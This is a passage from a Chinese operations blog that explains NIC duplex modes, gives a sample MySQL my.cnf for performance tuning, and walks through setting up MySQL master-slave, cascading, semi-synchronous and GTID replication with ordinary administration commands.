<h3 id="冲突域和广播域"><a href="#冲突域和广播域" class="headerlink" title="冲突域和广播域"></a>冲突域和广播域</h3><h3 id="三种通讯机制"><a href="#三种通讯机制" class="headerlink" title="三种通讯机制"></a>三种通讯机制</h3><p>单工通信：只有一个方向的通信，比如 收音机<br>半双工通信：通信双方可以发送和接受消息，但是不能同时发送，也不能同时接受，比如 对讲机<br>全双工通信： FD（Full Duplex） 通信双方可以同时发送和同时接受，比如 手机</p>
<p>查看网卡支持双工和网速：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mii-tool eth0
mii-tool <span class="token parameter variable">-v</span> eth0

<span class="token function">ethtool</span> <span class="token parameter variable">-i</span> eth0
<span class="token function">ethtool</span> eth0</code></pre>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/MySQL/MySQL%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/MySQL/MySQL%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/" class="post-title-link" itemprop="url">MySQL性能优化</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-12-31 23:16:19" itemprop="dateCreated datePublished" datetime="2020-12-31T23:16:19+08:00">2020-12-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="压力测试工具"><a href="#压力测试工具" class="headerlink" title="压力测试工具"></a>压力测试工具</h2><ul>
<li>Sysbench：功能强大，官网： <a target="_blank" rel="noopener" href="https://github.com/akopytov/sysbench">https://github.com/akopytov/sysbench</a></li>
<li>tpcc-mysql</li>
</ul>
<h2 id="生产环境-my-cnf-配置案例"><a href="#生产环境-my-cnf-配置案例" class="headerlink" title="生产环境 my.cnf 配置案例"></a>生产环境 my.cnf 配置案例</h2><p>配置文件生成工具参考链接：<a target="_blank" rel="noopener" href="https://imysql.com/my_cnf_generator">https://imysql.com/my_cnf_generator</a></p>
<pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token comment">#打开独立表空间</span>
<span class="token key attr-name">innodb_file_per_table</span> <span class="token punctuation">=</span> <span class="token value attr-value">1</span>
<span class="token comment">#MySQL 服务所允许的同时会话数的上限，经常出现Too Many Connections的错误提示，则需要增大此值</span>
<span class="token key attr-name">max_connections</span> <span class="token punctuation">=</span> <span class="token value attr-value">8000</span>
<span class="token comment">#所有线程所打开表的数量</span>
<span class="token key attr-name">open_files_limit</span> <span class="token punctuation">=</span> <span class="token value attr-value">10240</span>
<span class="token comment">#back_log 是操作系统在监听队列中所能保持的连接数</span>
<span class="token key attr-name">back_log</span> <span class="token punctuation">=</span> <span class="token value attr-value">300</span>
<span class="token comment">#每个客户端连接最大的错误允许数量，当超过该次数，MYSQL服务器将禁止此主机的连接请求，直到MYSQL服务器重启或通过flush hosts命令清空此主机的相关信息</span>
<span class="token key attr-name">max_connect_errors</span> <span class="token punctuation">=</span> <span class="token value attr-value">1000</span>
<span class="token comment">#每个连接传输数据大小.最大1G，须是1024的倍数，一般设为最大的BLOB的值</span>
<span class="token key attr-name">max_allowed_packet</span> <span class="token punctuation">=</span> <span class="token value attr-value">32M</span>
<span class="token comment">#指定一个请求的最大连接时间</span>
<span class="token key attr-name">wait_timeout</span> <span class="token punctuation">=</span> <span class="token value attr-value">10</span>
<span class="token comment"># 排序缓冲被用来处理类似ORDER BY以及GROUP BY队列所引起的排序</span>
<span class="token key attr-name">sort_buffer_size</span> <span class="token punctuation">=</span> <span class="token value attr-value">16M</span>
<span class="token comment">#不带索引的全表扫描.使用的buffer的最小值</span>
<span class="token key attr-name">join_buffer_size</span> <span class="token punctuation">=</span> <span class="token value attr-value">16M</span>
<span class="token comment">#查询缓冲大小</span>
<span class="token key attr-name">query_cache_size</span> <span class="token punctuation">=</span> <span class="token value attr-value">128M</span>
<span class="token comment">#指定单个查询能够使用的缓冲区大小，缺省为1M</span>
<span class="token key attr-name">query_cache_limit</span> <span class="token punctuation">=</span> <span class="token value attr-value">4M</span>
<span class="token comment"># 设定默认的事务隔离级别</span>
<span class="token key attr-name">transaction_isolation</span> <span class="token punctuation">=</span> <span class="token value attr-value">REPEATABLE-READ</span>
<span class="token comment"># 线程使用的堆大小. 此值限制内存中能处理的存储过程的递归深度和SQL语句复杂性，此容量的内存在每次</span>
连接时被预留.
<span class="token key attr-name">thread_stack</span> <span class="token punctuation">=</span> <span class="token value attr-value">512K</span>
<span class="token comment"># 二进制日志功能</span>
<span class="token key attr-name">log-bin</span><span class="token punctuation">=</span><span class="token value attr-value">/data/mysqlbinlogs/</span>
<span class="token comment">#二进制日志格式</span>
<span class="token key attr-name">binlog_format</span><span class="token punctuation">=</span><span class="token value attr-value">row</span>
<span class="token comment">#InnoDB使用一个缓冲池来保存索引和原始数据, 可设置这个变量到物理内存大小的80%</span>
<span class="token key attr-name">innodb_buffer_pool_size</span> <span class="token punctuation">=</span> <span class="token value attr-value">24G</span>
<span class="token comment">#用来同步IO操作的IO线程的数量</span>
<span class="token key attr-name">innodb_file_io_threads</span> <span class="token punctuation">=</span> <span class="token value attr-value">4</span>
<span class="token comment">#在InnoDb核心内的允许线程数量，建议的设置是CPU数量加上磁盘数量的两倍</span>
<span class="token key attr-name">innodb_thread_concurrency</span> <span class="token punctuation">=</span> <span class="token value attr-value">16</span>
<span class="token comment"># 用来缓冲日志数据的缓冲区的大小</span>
<span class="token key attr-name">innodb_log_buffer_size</span> <span class="token punctuation">=</span> <span class="token value attr-value">16M</span>
<span class="token comment"># 在日志组中每个日志文件的大小</span>
<span class="token key attr-name">innodb_log_file_size</span> <span class="token punctuation">=</span> <span class="token value attr-value">512M</span>
<span class="token comment"># 在日志组中的文件总数</span>
<span class="token key attr-name">innodb_log_files_in_group</span> <span class="token punctuation">=</span> <span class="token value attr-value">3</span>
<span class="token comment"># SQL语句在被回滚前,InnoDB事务等待InnoDB行锁的时间</span>
<span class="token key attr-name">innodb_lock_wait_timeout</span> <span class="token punctuation">=</span> <span class="token value attr-value">120</span>
<span class="token comment">#慢查询时长</span>
<span class="token key attr-name">long_query_time</span> <span class="token punctuation">=</span> <span class="token value attr-value">2</span>
<span class="token comment">#将没有使用索引的查询也记录下来</span>
log-queries-not-using-indexes</code></pre>

<h2 id="MySQL-配置最佳实践"><a href="#MySQL-配置最佳实践" class="headerlink" title="MySQL 配置最佳实践"></a>MySQL 配置最佳实践</h2>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/MySQL/MySQL%E9%9B%86%E7%BE%A4Cluster/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/MySQL/MySQL%E9%9B%86%E7%BE%A4Cluster/" class="post-title-link" itemprop="url">MySQL集群Cluster</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-12-31 23:12:11" itemprop="dateCreated datePublished" datetime="2020-12-31T23:12:11+08:00">2020-12-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kevingrace/p/6256603.html">主从复制</a></h2><p>主从复制用来做读写分离，主节点负责写，从节点负责读</p>
<p>默认异步复制，客户端性能良好，但是主从数据不一致比较常见</p>
<p><strong>主从复制架构，常用的有三种：</strong></p>
<p><a href="..........%5CLinux%E4%BA%91%E8%AE%A1%E7%AE%97%5Cmycat-definitive-guide.pdf">mycat-definitive-guide.pdf</a> <img data-src="//img.to2b.cn/blog/ljk/1603452172698.png"></p>
<p><strong>主从复制原理：</strong></p>
<p><img data-src="//img.to2b.cn/blog/ljk/1603541117982.png"></p>
<p>涉及到三个线程，dump 线程、io 线程、sql 线程，它们三个接力完成主从复制</p>
<p>dump 线程自动启动，io 线程和 sql 线程使用<code>start slave;</code>命令手动启动</p>
<ol>
<li>主节点 数据更新</li>
<li>主节点 将数据库更改的操作写入二进制日志</li>
<li>主节点 的 dump 线程，将更改的二进制部分发送给从节点</li>
<li>从节点 的 io 线程接收主节点发过来的二进制日志，并写入到中继日志中</li>
<li>从节点 的 sql 线程读取中继日志，操作数据库，从而完成数据同步</li>
</ol>
<p>relay log：中继日志，就是从主节点拷贝的二进制日志，重新命名而已，主要二进制日志不要使用 STATEMENT 模式，推荐使用 ROW 模式</p>
<h3 id="实现主从复制"><a href="#实现主从复制" class="headerlink" title="实现主从复制"></a>实现主从复制</h3><p>必要的配置项说明：</p>
<pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">mysqld</span><span class="token punctuation">]</span></span>
<span class="token comment"># 当前节点的id号，要求全局唯一，可以使用ip的最后一位`hostname -I | awk 'BEGIN&#123;FS="."&#125;&#123;print $4&#125;'`</span>
<span class="token key attr-name">server-id</span> <span class="token punctuation">=</span> <span class="token value attr-value">1</span>
<span class="token comment"># 开启二进制日志</span>
<span class="token key attr-name">log_bin</span> <span class="token punctuation">=</span> <span class="token value attr-value">mysql-bin</span>
<span class="token comment"># 10000次事件后master.info同步到磁盘，默认就是10000，主节点设置</span>
<span class="token key attr-name">sync-master-info</span> <span class="token punctuation">=</span> <span class="token value attr-value">10000</span>

<span class="token comment"># 设置只读，从节点设置</span>
<span class="token key attr-name">read_only</span><span class="token punctuation">=</span><span class="token value attr-value">ON</span>
<span class="token comment"># relay log的文件路径，默认值hostname-relay-bin，从节点设置</span>
<span class="token key attr-name">relay_log</span><span class="token punctuation">=</span><span class="token value attr-value">relay-log</span>
<span class="token comment"># 默认值hostname-relay-bin.index，从节点设置</span>
<span class="token key attr-name">relay_log_index</span><span class="token punctuation">=</span><span class="token value attr-value">relay-log.index</span>
<span class="token comment"># 10000次写后同步relay log到磁盘，默认就是10000，从节点设置</span>
<span class="token key attr-name">sync_relay_log</span><span class="token punctuation">=</span><span class="token value attr-value">10000</span>
<span class="token comment"># 10000次事务后同步relay-log.info到磁盘，默认就是10000，从节点设置</span>
<span class="token key attr-name">sync_relay_log_info</span><span class="token punctuation">=</span><span class="token value attr-value">10000</span></code></pre>

<p>相关文件：</p>
<ul>
<li>master.info：用于保存 slave 连接至 master 时的相关信息，例如账号、密码、服务器地址等</li>
<li>relay-log.info：保存在当前 slave 节点上已经复制的当前二进制日志和本地 relay log 日志的对应关系</li>
<li>mariadb-relay-bin.00000#: 中继日志,保存从主节点复制过来的二进制日志,本质就是二进制日志</li>
</ul>
<p>启动从节点的命令：<code>CHANGE MASTER TO</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># help CHANGE MASTER TO; 查看范例</span>
CHANGE MASTER TO
  <span class="token assign-left variable">MASTER_HOST</span><span class="token operator">=</span><span class="token string">'master2.example.com'</span>,
  <span class="token assign-left variable">MASTER_USER</span><span class="token operator">=</span><span class="token string">'replication'</span>,
  <span class="token assign-left variable">MASTER_PASSWORD</span><span class="token operator">=</span><span class="token string">'password'</span>,
  <span class="token assign-left variable">MASTER_PORT</span><span class="token operator">=</span><span class="token number">3306</span>,
  <span class="token assign-left variable">MASTER_LOG_FILE</span><span class="token operator">=</span><span class="token string">'master2-bin.001'</span>,
  <span class="token assign-left variable">MASTER_LOG_POS</span><span class="token operator">=</span><span class="token number">4</span>,
  <span class="token assign-left variable">MASTER_CONNECT_RETRY</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span></code></pre>

<p>范例：一主一从</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 主节点：10.0.0.71</span>
<span class="token comment"># 1 如果是从零搭建，数据库是空的，如下，记住 mysql-bin.000002 和 154</span>
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show master logs<span class="token punctuation">;</span>
+------------------+-----------+
<span class="token operator">|</span> Log_name         <span class="token operator">|</span> File_size <span class="token operator">|</span>
+------------------+-----------+
<span class="token operator">|</span> mysql-bin.000001 <span class="token operator">|</span>       <span class="token number">177</span> <span class="token operator">|</span>
<span class="token operator">|</span> mysql-bin.000002 <span class="token operator">|</span>       <span class="token number">154</span> <span class="token operator">|</span>
+------------------+-----------+
<span class="token number">3</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
<span class="token comment"># 2 创建有复制权限的用户账号</span>
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>CREATE <span class="token environment constant">USER</span> <span class="token string">'repluser'</span>@<span class="token string">'10.0.0.%'</span> IDENTIFIED BY <span class="token string">"123456"</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>GRANT replication slave ON *.* TO <span class="token string">'repluser'</span>@<span class="token string">'10.0.0.%'</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>FLUSH PRIVILEGES<span class="token punctuation">;</span>

<span class="token comment"># 3 使用xtrabackup全量备份数据库，将备份的数据scp到从节点，从节点还原数据</span>

<span class="token comment"># 从节点：10.0.0.72</span>
<span class="token punctuation">[</span>root@c72 ~<span class="token punctuation">]</span><span class="token variable">$vim</span> slave.conf
CHANGE MASTER TO
  <span class="token assign-left variable">MASTER_HOST</span><span class="token operator">=</span><span class="token string">'10.0.0.71'</span>,
  <span class="token assign-left variable">MASTER_USER</span><span class="token operator">=</span><span class="token string">'repluser'</span>,
  <span class="token assign-left variable">MASTER_PASSWORD</span><span class="token operator">=</span><span class="token string">'123456'</span>,
  <span class="token assign-left variable">MASTER_PORT</span><span class="token operator">=</span><span class="token number">3306</span>,
  <span class="token assign-left variable">MASTER_LOG_FILE</span><span class="token operator">=</span><span class="token string">'mysql-bin.000002'</span>,
  <span class="token assign-left variable">MASTER_LOG_POS</span><span class="token operator">=</span><span class="token number">154</span>,
  <span class="token assign-left variable">MASTER_CONNECT_RETRY</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>
<span class="token comment"># 如果已经使用xtrabackup还原了数据</span>
<span class="token punctuation">[</span>root@c72 ~<span class="token punctuation">]</span><span class="token variable">$cat</span> /data/backup/base/xtrabackup_binlog_info
mysql-bin.000002        <span class="token number">11285</span>
CHANGE MASTER TO
  <span class="token assign-left variable">MASTER_HOST</span><span class="token operator">=</span><span class="token string">'10.0.0.71'</span>,
  <span class="token assign-left variable">MASTER_USER</span><span class="token operator">=</span><span class="token string">'repluser'</span>,
  <span class="token assign-left variable">MASTER_PASSWORD</span><span class="token operator">=</span><span class="token string">'123456'</span>,
  <span class="token assign-left variable">MASTER_PORT</span><span class="token operator">=</span><span class="token number">3306</span>,
  <span class="token assign-left variable">MASTER_LOG_FILE</span><span class="token operator">=</span><span class="token string">'mysql-bin.000002'</span>,
  <span class="token assign-left variable">MASTER_LOG_POS</span><span class="token operator">=</span><span class="token number">11285</span>,
  <span class="token assign-left variable">MASTER_CONNECT_RETRY</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>
<span class="token comment"># 4 启动从节点</span>
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>source ~/slave.conf
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>start slave<span class="token punctuation">;</span>

<span class="token comment"># 从节点清除master.info ，relay-log.info, relay log ，开始新的relay log</span>
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>stop slave<span class="token punctuation">;</span>
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>RESET SLAVE<span class="token punctuation">;</span>

<span class="token comment"># 从节点清除master.info ，relay-log.info, relay log ，开始新的relay log，</span>
<span class="token comment"># 并清除和主节点的同步信息，如果再和主节点同步需要重新执行CHANGE MASTER TO语句</span>
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>stop slave<span class="token punctuation">;</span>
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>RESET SLAVE ALL<span class="token punctuation">;</span></code></pre>

<p>范例：当主节点宕机，提升一个从节点为新的主节点</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1 找到哪个从节点的数据库是最新，让它成为新主节点</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#cat /var/lib/mysql/relay-log.info</span>
<span class="token number">5</span>
./mariadb-relay-bin.000002
<span class="token number">1180</span>
mysql-bin.000002
<span class="token number">996</span>
<span class="token number">0</span>
<span class="token comment"># 2 新主节点修改配置文件，关闭read-only配置</span>
<span class="token comment"># 3 清除之前的主从复制信息</span>
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>stop slave<span class="token punctuation">;</span>
<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span>RESET SLAVE ALL<span class="token punctuation">;</span>
<span class="token comment"># 4 新主节点使用xtrabackup全量备份</span>
<span class="token comment"># 5 其他从节点重新还原数据库，指向新的主节点</span></code></pre>

<h3 id="实现级联复制"><a href="#实现级联复制" class="headerlink" title="实现级联复制"></a>实现级联复制</h3><p><img data-src="//img.to2b.cn/blog/ljk/1603457683534.png"></p>
<p>关键点在于中间的级联节点需要添加 log_slave_updates 配置项</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在10.0.0.8充当master</span>
<span class="token comment"># 在10.0.0.18充当级联slave</span>
<span class="token comment"># 在10.0.0.28充当slave</span>

<span class="token comment"># 在master实现</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#vim /etc/my.cnf.d/mariadb-server.cnf</span>
<span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span>
server-id<span class="token operator">=</span><span class="token number">8</span>
log-bin

<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#systemctl restart mariadb</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#mysql</span>
MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> grant replication slave on *.* to repluser@<span class="token string">'10.0.0.%'</span>
identified by <span class="token string">'magedu'</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#mysqldump -A -F --single-transaction --master-data=1 ></span>
/data/all.sql
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#scp /data/all.sql 10.0.0.18:/data</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#scp /data/all.sql 10.0.0.28:/data</span>

<span class="token comment"># 在中间级联slave实现</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#vim /etc/my.cnf.d/mariadb-server.cnf</span>
<span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span>
server-id<span class="token operator">=</span><span class="token number">18</span>
log-bin
read-only
log_slave_updates <span class="token comment">#级联复制中间节点的必选项</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#systemctl restart mariadb</span>

<span class="token comment"># 还原数据库</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#vim /data/all.sql</span>
CHANGE MASTER TO
    <span class="token assign-left variable">MASTER_HOST</span><span class="token operator">=</span><span class="token string">'master节点的iP'</span>,
    <span class="token assign-left variable">MASTER_USER</span><span class="token operator">=</span><span class="token string">'repluser'</span>,
    <span class="token assign-left variable">MASTER_PASSWORD</span><span class="token operator">=</span><span class="token string">'centos'</span>,
    <span class="token assign-left variable">MASTER_PORT</span><span class="token operator">=</span><span class="token number">3306</span>,
    <span class="token assign-left variable">MASTER_LOG_FILE</span><span class="token operator">=</span><span class="token string">'mysql-bin.000004'</span>,
    <span class="token assign-left variable">MASTER_LOG_POS</span><span class="token operator">=</span><span class="token number">523</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#mysql</span>
MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token builtin class-name">set</span> <span class="token assign-left variable">sql_log_bin</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token builtin class-name">source</span> /data/all.sql
MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show master logs<span class="token punctuation">;</span> <span class="token comment">#记录二进制位置，给第三个节点使用</span>
MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token builtin class-name">set</span> <span class="token assign-left variable">sql_log_bin</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> start slave<span class="token punctuation">;</span>

<span class="token comment"># 在第三个节点slave上实现</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#vim /etc/my.cnf.d/mariadb-server.cnf</span>
<span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span>
server-id<span class="token operator">=</span><span class="token number">28</span>
read-only
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#systemctl restart mariadb</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#vim /data/all.sql</span>
CHANGE MASTER TO
    <span class="token assign-left variable">MASTER_HOST</span><span class="token operator">=</span><span class="token string">'中间节点的IP'</span>,
    <span class="token assign-left variable">MASTER_USER</span><span class="token operator">=</span><span class="token string">'repluser'</span>,
    <span class="token assign-left variable">MASTER_PASSWORD</span><span class="token operator">=</span><span class="token string">'magedu'</span>,
    <span class="token assign-left variable">MASTER_PORT</span><span class="token operator">=</span><span class="token number">3306</span>,
    <span class="token assign-left variable">MASTER_LOG_FILE</span><span class="token operator">=</span><span class="token string">'mariadb-bin.000002'</span>, <span class="token assign-left variable">MASTER_LOG_POS</span><span class="token operator">=</span><span class="token number">344</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#mysql &lt; /data/all.sql</span>
<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#mysql -e 'start slave;'</span></code></pre>

<h3 id="半同步复制"><a href="#半同步复制" class="headerlink" title="半同步复制"></a><a target="_blank" rel="noopener" href="http://www.mamicode.com/info-detail-2722529.html">半同步复制</a></h3><p>主从复制基于 binary log，默认情况下，客户端操作数据库，数据库修改 binary log，返回结果给客户端，然后再将 binary log 推送给从节点，这就是异步复制，客户端体验好</p>
<p>MySQL 还提供了另一种主从同步方式：客户端操作数据库，数据库修改 binary log，将 binary log 推送给从节点，从节点收到后马上返回 binary log（file log），然后再将 binary log 应用到数据库，主节点接收到从节点返回的信息后再返回结果给客户端，因为主节点只是确认从节点是否正确接收到 binary log，而不是等待从节点完全完成主从复制，所以这种同步叫半同步复制</p>
<p>半同步复制可以设置时间，超时还没有等到从节点的回复，就不等了，直接返回成功的结果给客户端</p>
<h3 id="主从复制加密"><a href="#主从复制加密" class="headerlink" title="主从复制加密"></a>主从复制加密</h3><p>默认的主从复制，传输过程是明文的，如果想加密，可以使用 SSL&#x2F;TLS 加密</p>
<h3 id="GTID-复制"><a href="#GTID-复制" class="headerlink" title="GTID 复制"></a>GTID 复制</h3><p>传统的主从复制基于二进制日志，需要指定二进制日志和日志位置，从 mysql5.6 开始，支持 GTID 复制，基于 server-uuid，不需要指定二进制日志和日志位置，由主从节点自己协商同步</p>
<h3 id="主从复制的监控和维护"><a href="#主从复制的监控和维护" class="headerlink" title="主从复制的监控和维护"></a>主从复制的监控和维护</h3><h4 id="清理日志"><a href="#清理日志" class="headerlink" title="清理日志"></a>清理日志</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">PURGE</span> &#123; <span class="token keyword">BINARY</span> <span class="token operator">|</span> MASTER &#125; LOGS &#123; <span class="token keyword">TO</span> <span class="token string">'log_name'</span> <span class="token operator">|</span> BEFORE datetime_expr &#125;
RESET MASTER <span class="token keyword">TO</span>
